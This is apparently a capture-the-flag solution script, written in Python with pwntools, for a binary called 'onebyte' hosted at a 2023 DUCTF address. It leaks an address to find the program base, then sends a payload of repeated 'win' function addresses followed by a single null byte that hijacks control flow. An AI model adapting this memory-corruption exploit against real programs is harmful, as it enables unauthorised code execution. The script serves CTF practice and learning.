#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './onebyte'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '2023.ductf.dev', 30018

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+93
break *main+96
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

io.recvuntil(b'Free junk: ')
leak = int(io.recvline().strip(), 16)
elf.address = leak - elf.sym['init']

ropchain = flat([
    elf.sym['win']
])

read_size = 0x10
payload = flat(
    {read_size - len(ropchain): ropchain},
    filler=p32(elf.sym['win'])
) + b'\x00'     # brute force untill you get it right lmao
io.sendline(payload)

info('elf base: %#x', elf.address)
io.interactive()